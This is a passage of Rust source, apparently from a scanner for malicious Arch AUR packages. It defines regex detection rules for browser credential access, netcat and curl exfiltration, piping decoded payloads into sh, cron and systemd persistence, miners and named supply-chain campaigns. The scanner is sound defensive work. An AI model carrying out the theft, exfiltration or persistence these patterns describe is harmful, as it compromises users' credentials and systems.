                    pattern: r"\.config/chromium".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/BraveSoftware".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.librewolf".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.zen".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser profiles".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "BROWSER-002".to_string(),
            name: "Browser database access".to_string(),
            description: "Accessing browser SQLite databases (passwords, cookies, history)".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"logins\.json".to_string(),
                },
                Pattern::Regex {
                    pattern: r"Login Data".to_string(),
                },
                Pattern::Regex {
                    pattern: r"cookies\.sqlite".to_string(),
                },
                Pattern::Regex {
                    pattern: r"places\.sqlite".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser databases".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // NOTE: privilege escalation (PRIV-001..006: sudo, SUID/SGID, sudoers,
        // capabilities, kernel modules, install-hook sudo) is owned by the
        // privilege analyzer (privilege.rs), which is function-aware. It is not
        // duplicated as pattern rules, to keep each finding ID single-owner.

        // ============================================================
        // CRITICAL: Install Script Execution (CHAOS RAT attack vector)
        // ============================================================
        Rule {
            id: "INSTALL-001".to_string(),
            name: "Python execution in install script".to_string(),
            description: "Executing Python in post_install is suspicious. Used in July 2025 CHAOS RAT attack.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\bpython[23]?\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python\s+-c".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should not execute Python code".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "INSTALL-002".to_string(),
            name: "Binary execution in install script".to_string(),
            description: "Executing binaries from /opt or package directories during install".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/opt/[^/]+/[^/]+\.(py|sh|bin)".to_string(),
                },
                // A relative script/binary run in COMMAND position with a
                // dropped-payload extension. Requiring command position removes
                // the `cd ./build` argument false positive; requiring an
                // executable extension removes the `./configure` autotools false
                // positive (an extensionless build script). Dropped payloads
                // (`./payload.sh`, `./x/y.bin`) still match (defect #10). An
                // extensionless `./name` is intentionally not flagged here
                // because it is indistinguishable from `./configure`; the
                // campaign payload vectors are covered by INSTALL-001/003/004,
                // HIDDEN-003 and the ATOMIC rules.
                Pattern::Regex {
                    pattern: r"(?:^|[;&|]\s*)\./[\w./-]*\.(?:sh|bash|bin|run|elf|out|py|pl|rb|php)\b"
                        .to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Review any binary execution during installation".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "INSTALL-003".to_string(),
            name: "Network access in install script".to_string(),
            description: "Install scripts should not make network connections".to_string(),
            severity: Severity::Critical,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(curl|wget|aria2c|axel)\b".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should never download additional content".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "INSTALL-004".to_string(),
            name: "Language package manager invoked in install hook".to_string(),
            description: "An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(pip[23]?|pipx)\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bpoetry\s+(add|install)\b".to_string() },
                Pattern::Regex { pattern: r"\buv\s+(add|sync|pip|tool|run)\b".to_string() },
                Pattern::Regex { pattern: r"\bpdm\s+(add|install|sync)\b".to_string() },
                Pattern::Regex { pattern: r"\bconda\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcargo\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bgo\s+(install|get)\b".to_string() },
                Pattern::Regex { pattern: r"\bgem\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcomposer\s+(require|install)\b".to_string() },
                Pattern::Regex { pattern: r"\bdeno\s+(install|add|run|cache)\b".to_string() },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Persistence Mechanisms (2018 & 2025 attacks)
        // ============================================================
        Rule {
            id: "PERSIST-001".to_string(),
            name: "Systemd service creation in install".to_string(),
            description: "Creating systemd services in install scripts enables persistence. Used in 2018 xeactor and 2025 CHAOS RAT attacks.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemctl\s+(enable|start|daemon-reload)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/systemd/system/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"~/.config/systemd/user/".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Services should be enabled by the user, not automatically".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PERSIST-002".to_string(),
            name: "Systemd timer creation".to_string(),
            description: "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.timer".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnBootSec".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnUnitActiveSec".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Timers should be user-controlled; review carefully".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PERSIST-003".to_string(),
            name: "Cron job creation".to_string(),
            description: "Creating cron jobs for persistence".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            // Require a write/install verb (or crontab schedule edit). Bare path
            // mentions and removal (`rm /etc/cron.d/foo`) must not fire — packages
            // that clean up stale cron entries are the safe direction (issue #21).
            //
            // Adversarial notes (2.1.0-rc.1 review):
            // - Do NOT anchor with `^` alone: package() bodies are indented, and
            //   rust `regex` `^` is start-of-string unless `(?m)`.
            // - Do NOT match `crontab\s+-` as a prefix of `-l`/`-r` (that FPs).
            // - `regex` has no lookaround; enumerate write forms only.
            patterns: vec![
                // Copy/install/move/tee/link into a cron path (word-boundary,
                // any indent). `ln -s` plants a cron entry just as well as `cp`.
                //
                // Every pattern here stops at a command separator (`[^\n;&|]*`).
                // An unbounded `[^\n]*` reaches across `;` into the NEXT
                // command, so `cp a b; rm /etc/cron.d/x` would fire on the
                // removal -- re-breaking issue #21, where cleaning up a stale
                // cron entry is the safe direction and must stay silent.
                Pattern::Regex {
                    pattern: r"\b(?:cp|install|mv|tee|ln)\b[^\n;&|]*/etc/cron".to_string(),
                },
                // In-place edit of an existing cron file. `sed -i`/`ed`/`patch`
                // append a schedule without ever naming a write verb.
                Pattern::Regex {
                    pattern: r"\b(?:sed|perl|ed|patch)\b[^\n;&|]*(?:-i|--in-place)[^\n;&|]*/etc/cron"
                        .to_string(),
                },
                // ANY redirect into a cron path. Enumerating the printers
                // (echo/printf/cat) let every other producer through --
                // `curl ... > /etc/cron.d/pkg`, `base64 -d > ...`, or a bare
                // `> /etc/cron.d/pkg` truncation. The redirect IS the write, so
                // match on that rather than on what feeds it.
                //
                // The target must be the redirect's own next token (no spaces,
                // no separators), so `echo done > /dev/null; rm /etc/cron.d/x`
                // cannot match on the removal.
                Pattern::Regex {
                    pattern: r#">>?\s*["']?[^\n\s;&|]*/etc/cron"#.to_string(),
                },
                // A command and its arguments live on ONE line, so the
                // separator is `[ \t]+`, never `\s+`. Measured against 503 live
                // AUR PKGBUILDs, `\s+` crossing a newline made
                // `python-python-crontab` fire: `pkgname=...-crontab` at the end
                // of a line, `_name=...` on the next, and the file-argument
                // pattern matched the literal text "crontab\n_".
                //
                // crontab -e (edit schedule).
                Pattern::Regex {
                    pattern: r"\bcrontab[ \t]+-e\b".to_string(),
                },
                // crontab -u USER -e (user-targeted edit). Bare `-u` with `-l`
                // must not fire — no lookaround, so require the `-e` form.
                Pattern::Regex {
                    pattern: r"\bcrontab[ \t]+-u[ \t]+\S+[ \t]+-e\b".to_string(),
                },
                // `... | crontab -` reads the new table from stdin. This is THE
                // standard non-interactive install form, and the enumerated
                // verb list missed it completely: the file-argument pattern
                // below excludes `-` from its char class so a dash-flag like
                // `-l`/`-r` cannot trip it, which also excluded the bare `-`
                // that means stdin. Cover it explicitly, including the
                // `crontab -u root -` variant. End-of-argument only, so `-l`
                // and `-r` still cannot match.
                Pattern::Regex {
                    pattern: r"\bcrontab[ \t]+(?:-u[ \t]+\S+[ \t]+)?-[ \t]*(?:$|[\n;&|])"
                        .to_string(),
                },
                // crontab PATH / var (not a dash-flag). A path-shaped argument
                // is unambiguous, so it can appear anywhere on the line.
                Pattern::Regex {
                    pattern: r"\bcrontab[ \t]+(?:/|\./|\.\./|~|\$)".to_string(),
                },
                // crontab BARE-FILENAME. Split out because a bare word argument
                // is also what English prose looks like: `pkgdesc="Crontab
                // module for python"` matched the old combined char class and
                // fired on 1 of 503 live AUR PKGBUILDs. Requiring the filename
                // to END the command separates `crontab mycron` from
                // `Crontab module for ...`, where another word always follows.
                Pattern::Regex {
                    pattern: r"\bcrontab[ \t]+[A-Za-z0-9_.]+[ \t]*(?:$|[\n;&|])".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Cron jobs should be managed by the user".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PERSIST-004".to_string(),
            name: "rc.local modification".to_string(),
            description: "Modifying rc.local for boot persistence".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/rc\.local".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/rc\.d/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify boot scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PERSIST-005".to_string(),
            name: "XDG autostart creation".to_string(),
            description: "Creating autostart entries enables persistence at user login".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.config/autostart/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/xdg/autostart/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Autostart entries should be user-controlled".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PERSIST-006".to_string(),
            name: "Systemd masquerading".to_string(),
            description: "Binary named like systemd component is suspicious. CHAOS RAT used 'systemd-initd'.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemd-[a-z]+d\b".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/usr/lib/systemd/systemd-".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify this is a legitimate systemd component".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Cryptomining
        // ============================================================
        Rule {
            id: "CRYPTO-001".to_string(),
            name: "Mining pool connection".to_string(),
            description: "Connection to cryptocurrency mining pools".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"stratum\+tcp://".to_string(),
                },
                Pattern::Regex {
                    pattern: r"pool\.(minergate|supportxmr|nanopool|hashvault|minexmr|f2pool)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRYPTO-002".to_string(),
            name: "Cryptominer binary".to_string(),
            description: "Known cryptocurrency miner executable names".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(xmrig|cgminer|bfgminer|cpuminer|minerd|ethminer|t-rex|lolminer|phoenixminer)\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRYPTO-003".to_string(),
            name: "Monero/Bitcoin wallet address".to_string(),
            description: "Cryptocurrency wallet addresses indicate mining or theft".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                // Monero addresses: 95 chars starting with 4, require context
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|monero|xmr)[^=]*4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"#.to_string(),
                },
                // Bitcoin addresses with context (avoid matching checksums)
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|bitcoin|btc)[^=]*(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"#.to_string(),
                },
                // Standalone wallet variables
                Pattern::Regex {
                    pattern: r#"(?i)(wallet|donate)_?(addr|address)?\s*=\s*['"]?[a-zA-Z0-9]{26,}"#.to_string(),
                },
                // Bare Monero address by format (no surrounding keyword needed):
                // a miner config can drop the address with no `wallet`/`xmr`
                // nearby. `(?-i)` keeps the Base58 classes case-exact despite the
                // engine's case-insensitive default. The 95-char shape is highly
                // specific, so false positives are negligible.
                Pattern::Regex {
                    pattern: r#"(?-i:\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b)"#.to_string(),
                },
                // Bare Bech32 Bitcoin address (`bc1...`). Legacy 1.../3...
                // addresses are left keyword-anchored above as they are far more
                // false-positive prone than the distinctive bc1 prefix.
                Pattern::Regex {
                    pattern: r#"(?-i:\bbc1[02-9ac-hj-np-z]{11,71}\b)"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Wallet addresses in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Data Exfiltration
        // ============================================================
        Rule {
            id: "EXFIL-001".to_string(),
            name: "Curl POST data exfiltration".to_string(),
            description: "Sending data to external servers via curl POST".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*(-d|--data|--data-binary)\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-X\s+POST".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Build/install should not send data externally".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-002".to_string(),
            name: "Netcat data transfer".to_string(),
            description: "Using netcat to transfer data externally".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\|\s*nc\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"nc\s+[^\s]+\s+\d+\s*<".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Netcat should not be piping data in build scripts".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-003".to_string(),
            name: "Discord/Telegram webhook".to_string(),
            description: "Webhook URLs can be used for C2 communication or data exfiltration".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"discord(app)?\.com/api/webhooks/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"api\.telegram\.org/bot".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Webhook URLs in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // HIGH: Obfuscation Techniques
        // ============================================================
        Rule {
            id: "OBF-001".to_string(),
            name: "Base64 decoding".to_string(),
            description: "Base64 decoding may hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"base64\s+(-d|--decode)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64\s+-[a-zA-Z]*d".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review the base64 content manually".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-002".to_string(),
            name: "Eval usage".to_string(),
            description: "Eval can execute obfuscated malicious code".to_string(),
            severity: Severity::High,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: r"\beval\s+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Avoid eval; use direct commands instead".to_string(),
            cwe_id: Some("CWE-95".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-003".to_string(),
            name: "Hex-encoded payload".to_string(),
            description: "Hex encoding can hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\\x[0-9a-fA-F]{2}".to_string(),
                },
                Pattern::Regex {
                    pattern: r"xxd\s+-r".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review hex-encoded content".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-004".to_string(),
            name: "String concatenation obfuscation".to_string(),
            description: "Concatenating strings to hide commands".to_string(),
            severity: Severity::Medium,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r#"\$\{[a-z]\}.*\$\{[a-z]\}.*\$\{[a-z]\}"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review concatenated strings carefully".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-005".to_string(),
            name: "Gzip decode execution".to_string(),
            description: "Decompressing and executing payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(gzip|gunzip|zcat)\s+.*\|\s*(ba)?sh".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64.*\|\s*(gzip|gunzip)\s+.*\|\s*(ba)?sh".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decompress and review content before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-006".to_string(),
            name: "Quote-splitting / character obfuscation".to_string(),
            description:
                "A command is assembled from adjacent single-character quoted fragments \
                 (e.g. \"b\"'u''n') or ANSI-C escapes to hide it from literal matching. \
                 This is almost exclusively a malware evasion technique; aur-scan also \
                 reports the decoded command via its other rules."
                    .to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex {
                pattern: QUOTE_SPLIT_PATTERN.to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation:
                "De-obfuscate the command and review what it actually runs.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // HIGH: Suspicious URLs and Sources
        // ============================================================
        Rule {
            id: "URL-001".to_string(),
            name: "Raw IP in URL".to_string(),
            description: "URLs with raw IP addresses are suspicious".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![Pattern::Regex {
                pattern: r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Use domain names from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "URL-002".to_string(),
            name: "URL shortener".to_string(),
            description: "URL shorteners can hide malicious destinations".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(bit\.ly|tinyurl|t\.co|goo\.gl|is\.gd|v\.gd|shorte\.st|adf\.ly)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Always use full URLs from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "URL-003".to_string(),
            name: "Dynamic DNS domain".to_string(),
            description: "Dynamic DNS domains are often used for malware C2".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.(duckdns|no-ip|dynu|freedns|afraid)\.".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.(ddns|hopto|zapto|sytes|serveftp)\.".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Dynamic DNS domains are suspicious in packages".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        // NOTE: insecure transport (git://, git+http://, http://, ftp://) and
        // weak checksums (md5/sha1) are intentionally NOT pattern rules. They
        // are owned by the source analyzer (SRC-001) and checksum analyzer
        // (CHK-002/CHK-003) respectively, which parse the source/checksum arrays
        // structurally. Keeping a single owner per concept keeps finding IDs
        // unique and auditable (see the `catalog` module).

        // ============================================================
        // HIGH: Hidden Files and Suspicious Paths
        // ============================================================
        Rule {
            id: "HIDDEN-001".to_string(),
            name: "Hidden file creation in home".to_string(),
            description: "Creating hidden files in user home directory".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.[^/]+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.[^/]+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not create hidden files in user home".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "HIDDEN-002".to_string(),
            name: "Tmp directory execution".to_string(),
            description: "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                // Executing FROM /tmp: a /tmp path in COMMAND position -- at the
                // start of a (logical) line, right after a command separator
                // (`;` `&` `|`), or as the target of an exec verb / interpreter.
                // This is the "execution" the rule is named for. It deliberately
                // does NOT match a /tmp path used as an assignment value or a
                // plain argument (`TMPDIR=/tmp/x`, `mktemp -d /tmp/x`, `cp foo
                // /tmp/x`, `> /tmp/x`), which are benign and were the source of
                // false positives (defect #10).
                Pattern::Regex {
                    pattern: format!(
                        r"(?:^|[;&|]|\b(?:exec|source|eval|{SHELLS}|python[23]?|perl|ruby|node|php)\s+)\s*\.?/tmp/\S+"
                    ),
                },
                Pattern::Regex {
                    pattern: r"chmod\s+\+x\s+/tmp/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not execute from /tmp".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "HIDDEN-003".to_string(),
            name: "Binary in non-standard location".to_string(),
            description: "Placing binaries in /usr/local/share or ~/.local/share. Used by CHAOS RAT.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(cp|mv|install).*(/usr/local/share|~/.local/share)/[^/]+\.(bin|elf|py|sh)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Binaries should be placed in standard locations".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // HIGH: Environment Manipulation
        // ============================================================
        Rule {
            id: "ENV-001".to_string(),
            name: "LD_PRELOAD manipulation".to_string(),
            description: "LD_PRELOAD can be used to inject malicious libraries".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"LD_PRELOAD\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/ld\.so\.preload".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "LD_PRELOAD manipulation is extremely suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
            // Env-var NAMEs are case-sensitive in bash, and `/etc/ld.so.preload`
            // is a fixed lowercase path: a lowercase `ld_preload=` does NOT set
            // the real variable, so matching case-insensitively would only add
            // false positives without catching any real attack (audit HI-6 caveat).
            case_sensitive: true,
        },
        Rule {
            id: "ENV-002".to_string(),
            name: "PATH manipulation".to_string(),
            description: "Modifying PATH to hijack commands".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"export\s+PATH\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r#"PATH\s*=\s*["']?[^\$]"#.to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "PATH manipulation in install scripts is suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
            // `PATH` is a canonical upper-case env-var NAME; a lowercase `path=`
            // is an ordinary local variable, so keep this case-sensitive to avoid
            // false positives (audit HI-6 caveat).
            case_sensitive: true,
        },
        Rule {
            id: "ENV-003".to_string(),
            name: "Shell startup file modification".to_string(),
            description: "Modifying shell config for persistence (bashrc, zshrc, fish, profile.d)"
                .to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            // Path presence only — informational_lines() strips pure-printer
            // heredoc bodies and message prints so a "add this to ~/.bashrc"
            // note does not fire (issue #15). Real redirects/writes still match.
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv|config/fish/)"
                        .to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/(bash\.bashrc|profile|profile\.d/|zsh/|fish/)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify shell configuration".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // INFO/LOW: Package Metadata Warnings
        // ============================================================
        Rule {
            id: "META-001".to_string(),
            name: "Provides impersonation".to_string(),
            description: "Package provides another package name, may be impersonating. CHAOS RAT used this technique.".to_string(),
            severity: Severity::Low,
            category: Category::SuspiciousMetadata,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"^provides=".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild],
            recommendation: "Verify this package is a legitimate alternative".to_string(),
            cwe_id: None,
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: "Atomic Arch" supply-chain campaign (June 2026)
        // Orphaned AUR packages were adopted and their PKGBUILD/install
        // hooks modified to pull malicious npm/bun packages
        // (atomic-lockfile, js-digest, lockfile-js) that drop a
        // credential stealer and an eBPF rootkit (scales.bpf.c).
        // ============================================================
        Rule {
            id: "ATOMIC-001".to_string(),
            name: "Atomic Arch malicious npm/bun package".to_string(),
            description: "References a known-malicious package from the June 2026 'Atomic Arch' AUR supply-chain campaign (atomic-lockfile, js-digest, lockfile-js, nextfile-js / ansi-colors-nextfile-js and related wave-3 names). These pull an infostealer and eBPF rootkit during the build/install phase.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                // Word-boundary on known campaign package names. `nextfile-js`
                // also matches when embedded in a scoped/decorated name
                // (`ansi-colors-nextfile-js`) via the alternation.
                pattern: r"\b(atomic-lockfile|js-digest|lockfile-js|nextfile-js|ansi-colors-nextfile-js)\b"
                    .to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do NOT build. This is a known-malicious dependency. Remove the package and treat the host as compromised: rotate credentials (SSH, npm/GitHub tokens, browser sessions).".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "ATOMIC-004".to_string(),
            name: "Sudo shim in user local bin".to_string(),
